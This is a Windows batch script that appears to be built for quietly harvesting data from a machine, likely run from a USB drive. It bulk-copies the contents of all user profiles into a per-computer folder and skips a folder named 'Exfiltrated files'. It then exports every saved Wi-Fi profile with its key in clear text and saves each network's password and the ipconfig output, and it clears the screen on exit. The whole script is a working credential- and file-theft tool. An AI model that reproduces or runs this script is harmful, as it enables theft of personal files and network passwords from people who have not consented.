@echo on

set log=%~dp0\robocopy\%COMPUTERNAME%\Logs
mkdir %log%

set dst=%~dp0\robocopy\%COMPUTERNAME%\All_Users
mkdir %dst%

if Exist C:\Users (
robocopy C:\Users %dst% /E /XF *.vdi *.iso *.zip *.tar.gz *.vdb *.ide *.dll *.crt *.reg /XD AppData /XD "Exfiltrated files" /A-:SH /XA:SHCT /XJ /MT:32 /R:0 /W:0 /LOG+:%log%\Users.txt /FP /TEE
)

@echo off
setlocal enabledelayedexpansion

set "wlan=%~dp0\robocopy\%COMPUTERNAME%\WLAN_Creds"
mkdir "!wlan!" 2>nul

netsh wlan export profile key=clear folder="!wlan!" > nul

for /f "tokens=2 delims=:" %%a in ('type "!wlan!\wlan_profiles.xml" ^| findstr "SSID"') do (
    set "ssid=%%a"
    set "ssid=!ssid:~1!"
    set "ssid=!ssid:~0,-1!"

    echo Retrieving key for SSID: !ssid!
    netsh wlan show profile name="!ssid!" key=clear > "!wlan!\!ssid!.txt"
)

ipconfig /all > "!wlan!\wlan.txt"
@cls
@exit
